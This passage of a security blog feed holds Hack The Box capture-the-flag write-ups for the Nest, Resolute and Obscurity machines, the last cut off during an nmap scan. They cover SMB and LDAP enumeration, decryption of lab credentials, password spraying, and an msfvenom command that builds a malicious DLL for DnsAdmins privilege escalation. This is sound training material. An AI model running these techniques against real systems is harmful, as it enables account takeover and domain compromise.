&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 10.10.10.178                                                                                    
Host is up (0.024s latency).                                                                                         
Not shown: 65533 filtered ports                                                                                      
PORT     STATE SERVICE       VERSION                                                                                 
445/tcp  open  microsoft-ds?                                                                                         
4386/tcp open  unknown                                                                                               
| fingerprint-strings:                                                                                               
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2                                                                                         
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help:          
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---                  
|     LIST   
|     SETDIR &amp;lt;Directory_Name&amp;gt;
|     RUNQUERY &amp;lt;Query_ID&amp;gt;          
|     DEBUG &amp;lt;Password&amp;gt;
|_    HELP &amp;lt;Command&amp;gt; 

Host script results:
|_clock-skew: 1m02s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-23T15:52:23
|_  start_date: 2020-04-22T20:12:01
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;initial-enumeration&quot;&gt;Initial Enumeration&lt;/h2&gt;
&lt;p&gt;With only two open ports, I chose to look at the uncommon service running on port 4386. Telneting in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HQK Reporting Service V1.2&lt;/code&gt; is displayed, with a prompt. Typing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;help&lt;/code&gt; shows various commands. I’m sure I will have to dig into this more later.
&lt;img src=&quot;\assets\images\htb\nest\nest-telnet.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;\assets\images\htb\nest\nest-smbclient.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exploring the shares on SMB to see what could be accessed and I found that only the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data&lt;/code&gt; share had a couple of readable files.
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Maintenance Alerts.txt&lt;/code&gt;&lt;br /&gt;
&lt;img src=&quot;\assets\images\htb\nest\nest-maint.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have some creds.&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Welcome Email.txt&lt;/code&gt;&lt;br /&gt;
&lt;img src=&quot;\assets\images\htb\nest\nest-welcome.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;further-data-share-enumeration&quot;&gt;Further Data Share Enumeration&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;\assets\images\htb\nest\nest-smbmap.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To begin enumeration I recursively listed the Data share to learn that I had read access to various &lt;em&gt;new&lt;/em&gt; files.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.\Data\IT\Configs\Adobe\*     
dr--r--r--                0 Wed Aug  7 15:20:13 2019    .
dr--r--r--                0 Wed Aug  7 15:20:13 2019    ..
fr--r--r--              246 Wed Aug  7 15:20:13 2019    editing.xml
fr--r--r--                0 Wed Aug  7 15:20:09 2019    Options.txt
fr--r--r--              258 Wed Aug  7 15:20:09 2019    projects.xml
fr--r--r--             1274 Wed Aug  7 15:20:09 2019    settings.xml
.\Data\IT\Configs\Atlas\*
dr--r--r--                0 Tue Aug  6 07:16:34 2019    .
dr--r--r--                0 Tue Aug  6 07:16:34 2019    ..
fr--r--r--             1369 Tue Aug  6 07:18:38 2019    Temp.XML
.\Data\IT\Configs\Microsoft\*
dr--r--r--                0 Wed Aug  7 15:23:26 2019    .
dr--r--r--                0 Wed Aug  7 15:23:26 2019    ..
fr--r--r--             4598 Wed Aug  7 15:23:26 2019    Options.xml
.\Data\IT\Configs\NotepadPlusPlus\*
dr--r--r--                0 Wed Aug  7 15:33:54 2019    .
dr--r--r--                0 Wed Aug  7 15:33:54 2019    ..
fr--r--r--             6451 Wed Aug  7 19:01:25 2019    config.xml
fr--r--r--             2108 Wed Aug  7 19:00:36 2019    shortcuts.xml
.\Data\IT\Configs\RU Scanner\*
dr--r--r--                0 Wed Aug  7 16:01:13 2019    .
dr--r--r--                0 Wed Aug  7 16:01:13 2019    ..
fr--r--r--              270 Thu Aug  8 15:49:37 2019    RU_config.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbget -Rrv  smb://10.10.10.178/Data/ -U TempUser&lt;/code&gt; to snag all the files locally.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data\IT\Configs\NotepadPlusPlus\config.xml&lt;/code&gt; contained an interesting path:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;File filename=&quot;C:\windows\System32\drivers\etc\hosts&quot; /&amp;gt;
&amp;lt;File filename=&quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&quot; /&amp;gt;
&amp;lt;File filename=&quot;C:\Users\C.Smith\Desktop\todo.txt&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I found a username and password entry in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data\IT\Configs\RU Scanner\RU_config.xml&lt;/code&gt; and attempted a login, but it appears the password is encrypted when I decoded it.
&lt;img src=&quot;\assets\images\htb\nest\nest-ru-config.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Taking a look at the newly discovered path (Secure$\IT\Carl) at the Secure$ share, I used smbclient to uncover a trove of files in Carl’s directory. Particularly interesting is the RUScanner files, which appear to be a Visual Basic project!
&lt;img src=&quot;\assets\images\htb\nest\nest-carl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’ll use smbget again to snag a copy of all the files locally to examine then more closely.
&lt;img src=&quot;\assets\images\htb\nest\nest-smbget.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Within Utils.vb there is a decrypt function:
&lt;img src=&quot;\assets\images\htb\nest\nest-decrypt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With this information, I decided to build out a simple project in Visual Studio. Basically I combined all the key classes from Carl’s RUScanner and I added a few lines to print the decrypted password to the console.
&lt;img src=&quot;\assets\images\htb\nest\nest-studio.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This gave us the password from the RU_Config.xml I found earlier. 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xRxRxPANCAK3SxRxRx&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Using it to access the Users share we got the user flag, an executable and various files related to the other port from earlier - HQK Reporting.
&lt;img src=&quot;\assets\images\htb\nest\nest-smith.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The “Debug Mode Password.txt” showed a size of 0 and I thought that was peculiar, and it turned out it had an alternate data stream, so I grabbed it.
&lt;img src=&quot;\assets\images\htb\nest\nest-stream.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\htb\nest\nest-file.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used the Debug Mode Password within a telnet session with the HQK Reporting service and found what appears to be an ldap configuration file. I attempted to use the password “as is” in various capacities, but that returned nothing. B64 decoded, it appears as an encrypted value. Let’s move on the binary. 
&lt;img src=&quot;\assets\images\htb\nest\nest-HQK.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using dnSpy, Taking a look at the HqkLdap.exe binary, we see some interesting functions.
&lt;img src=&quot;\assets\images\htb\nest\nest-dnspy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I locally created the Ldap.conf (with the file found from earlier). I also had to create an empty &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HqkDbImport.exe&lt;/code&gt; file because the binary checks for the existence of it. I set a breakpoint within the Main function for when after the LDAP password is decrypted and we see the decrypted value when it gets returned. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XtH4nkS4Pl4y1nGX&lt;/code&gt;
&lt;img src=&quot;\assets\images\htb\nest\nest-dnspy-pass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used the password with the Administrator account to access the C$ share with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; and was able to obtain the root flag. Thanks for reading!
&lt;img src=&quot;\assets\images\htb\nest\nest-root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="smb" /><category term="dnspy" /><category term="penetration testing" /><category term="write-ups" /><summary type="html">Nest was an excellent *easy*-rated machine on Hack The Box created by VbScrub. Initial recon revealed an open SMB port and an uncommon HQK Reporting service. Enumerating SMB revealed some default credentials, which allowed further read access. Digging further we come across some encrypted credentials and a Visual Basic project. Building the project we are able to decrypt yet another password, but this time for an user `c.smith`. We use the new found creds to go further into the SMB gauntlet and discover the HQK Reporting binary. Tearing it apart with dnSpy, and a touch of reversing, we get the Administrator password and root flag.</summary></entry><entry><title type="html">Resolute Write-Up: Hack The Box</title><link href="https://gr0sabi.github.io/hackthebox/resolute-write-up-hack-the-box/" rel="alternate" type="text/html" title="Resolute Write-Up: Hack The Box" /><published>2020-05-30T00:00:00-04:00</published><updated>2020-05-30T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/resolute-write-up-hack-the-box</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/resolute-write-up-hack-the-box/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\resolute\resolute-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;Resolute was a straight-forward &lt;em&gt;medium&lt;/em&gt;-rated machine on Hack The Box created by egre55. Initial recon revealed an open LDAP service which leaked all local users and a default password. This allowed a password spray using WinRM and a successful login as user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melanie&lt;/code&gt;. As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melanie&lt;/code&gt;, further machine enumeration revealed PowerShell transcripts that leaked a command containing user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ryan&lt;/code&gt;’s password. User &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ryan&lt;/code&gt; is part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contractors&lt;/code&gt; group, which is also contained in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DnsAdmin&lt;/code&gt; group. Being a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DnsAdmin&lt;/code&gt; is abused to add the first compromised user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melanie&lt;/code&gt; as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Admin&lt;/code&gt;, owning the machine.&lt;/p&gt;

&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sCV -Pn -n -p- -T4 -oN nmap/full-resolute 10.10.10.169&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 20:36 EDT
Nmap scan report for 10.10.10.169
Host is up (0.029s latency).                      
Not shown: 65511 closed ports                     
PORT      STATE SERVICE      VERSION              
53/tcp    open  domain?                           
| fingerprint-strings:                            
|   DNSVersionBindReqTCP:                                                                                            
|     version                                     
|_    bind                                        
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-27 00:44:46Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                                                                                                
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0        
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped                                                                                           
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                          
|_http-title: Not Found    
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49712/tcp open  msrpc        Microsoft Windows RPC
65424/tcp open  unknown

Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ldap-enumeration&quot;&gt;LDAP Enumeration&lt;/h2&gt;

&lt;p&gt;A default password is shown via the description for user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marko&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Marko Novak, Employees, MegaBank Users, megabank.local                                                             
dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user 
cn: Marko Novak                                           
sn: Novak 
description: Account created. Password set to Welcome123!
[TRUNCATED]
sAMAccountName: marko
sAMAccountType: 805306368
userPrincipalName: marko@megabank.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local                                            
dSCorePropagationData: 20190927221048.0Z
dSCorePropagationData: 20190927131714.0Z
dSCorePropagationData: 16010101000001.0Z
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I was unable to get any usage from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Welcome123!&lt;/code&gt; password and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Marko&lt;/code&gt;, so I created a username list and used Metasploit’s WinRM Login module to test the password against the remainder of the accounts.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch -h 10.10.10.169 -x -b &quot;DC=megabank,DC=local&quot; '(objectClass=Person)' | grep userPrincipalName | cut -d &quot; &quot; -f 2 | cut -d &quot;@&quot; -f 1 &amp;gt; users.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We got a hit on user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melanie&lt;/code&gt;.
&lt;img src=&quot;\assets\images\htb\resolute\resolute-winrm-scan.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;machine-compromise&quot;&gt;Machine Compromise&lt;/h2&gt;

&lt;p&gt;I used evil-WinRM to get a shell and grabbed the user flag.
&lt;img src=&quot;\assets\images\htb\resolute\resolute-melanie-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the root directory, we see an interesting folder that is hidden. This leads to an file that leaks the user Ryan’s password.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;File Location:&lt;/em&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\PStranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Line Containing Password Leak:&lt;/em&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;pivoting-to-dns-admin&quot;&gt;Pivoting to DNS Admin&lt;/h2&gt;

&lt;p&gt;Using Evil-WinRM I logged in with Ryan and noticed he was part of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contractors&lt;/code&gt; group. I love Bloodhound, so I used this opportunity to run it to enumerate everything that’s going on in the AD structure.&lt;/p&gt;

&lt;p&gt;Ryan was a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contractors&lt;/code&gt; group, but what is interesting is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contractors&lt;/code&gt; are a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DnsAdmins&lt;/code&gt; group. Privileges!
&lt;img src=&quot;\assets\images\htb\resolute\resolute-bloodhound.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some research, I followed these blog posts that outline a privilege escalation via a feature abuse in AD where a user who is member of the DNSAdmins group or have write privileges to a DNS server object can load an arbitrary DLL with SYSTEM privileges on the DNS server:
&lt;a href=&quot;https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html&quot; target=&quot;_blank&quot;&gt;Abusing DNSAdmins privilege for escalation in Active Directory&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise&quot; target=&quot;_blank&quot;&gt;From DnsAdmins to SYSTEM to Domain Compromise&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In accordance with the blog post, I created a malicous DLL that will add Melanie to the Domain Admins group:&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -a x64 -p windows/x64/exec cmd='net group &quot;domain admins&quot; melanie /add /domain' -f dll -o mel.dll&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\htb\resolute\resolute-dnscmd-entry.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;domain-admin-escalation&quot;&gt;Domain Admin Escalation&lt;/h2&gt;

&lt;p&gt;Now we  can log in with Melanie and grab the root flag:
&lt;img src=&quot;\assets\images\htb\resolute\resolute-root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="dns" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><summary type="html">Resolute was a straight-forward *medium*-rated machine on Hack The Box created by egre55. Initial recon revealed an open LDAP service which leaked all local users and a default password. This allowed a password spray WinRM and a successful login as user `melanie`. As `melanie`, further machine enumeration revealed PowerShell transcripts that leaked a command containing user `ryan`'s password. User `ryan` is part of the `Contractors` group, which is also contained in the `DnsAdmin` group. Being a member of the `DnsAdmin` is abused to add the first compromised user `melanie` as a `Domain Admin`, owning the machine.</summary></entry><entry><title type="html">Obscurity Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox/" rel="alternate" type="text/html" title="Obscurity Write-Up: HackTheBox" /><published>2020-05-09T00:00:00-04:00</published><updated>2020-05-09T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\obscurity\banner-obscurity.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;Obscurity was a fantastic machine of medium difficulty by clubby789 at HackTheBox. Rolling a few custom Python scripts for a web service, encryption, and SSH, Obscurity gave a couple of holes that I could squeeze through. With only a couple of open ports, it led me straight to enumerating the web application on port 8080. Examining the text on the main page it (surprisingly) leaked the file name of the webserver and allowed us to view the file with some directory traversal. Looking at the python file, it called a dangerous python exec() function which allowed us to obtain RCE via code injection. After getting a shell on the machine, we decrypt the user Robert’s Key and Password by reversing it with a script we create. These creds allow us SSH access as Robert, which gives us sudo permission to use an “unique” SSH script. With some simple bash magic, we can grab Root’s password hash and crack it with John.&lt;/p&gt;

&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
&lt;p&gt;Nmap reveals a couple of ports, SSH and a “BadHTTPServer” on port 8080.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sCV -Pn -n -p- -T4 -oN nmap/full-obscurity 10.10.10.168&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.168                         
                                                                                      
PORT     STATE  SERVICE    VERSION                                                                                   
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:                                                                                                       
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                      
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                    
80/tcp   closed http                                                                                                 
8080/tcp open   http-proxy BadHTTPServer                                                                             
| fingerprint-strings:                                                                                               
|   GetRequest, HTTPOptions:                                                                                         
|     HTTP/1.1 200 OK                                                                                                
|     Date: Mon, 27 Apr 2020 21:25:38                                                                                
|     Server: BadHTTPServer                                                                                          
|     Last-Modified: Mon, 27 Apr 2020 21:25:38                                                                       
|     Content-Length: 4171                                                                                           
|     Content-Type: text/html                                                                                        
|     Connection: Closed                                                                                             
|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;                                                                                                
|     &amp;lt;html &lt;span class=&quot;nv&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                               
|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                         
|     &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                         
|     &amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;                                                                                         
|     &amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IE=Edge&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                          
|     &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;width=device-width, initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                           
|     &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;keywords&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                              
|     &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;description&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                           
|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;                                                                                                           
|     Easy Profile Template                                                                                          
|     http://www.templatemo.com/tm-467-easy-profile                                                                  
|     &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; stylesheet css &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                        
|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;css/bootstrap.min.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                
|     &amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;css/font-awesome.min.css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                        
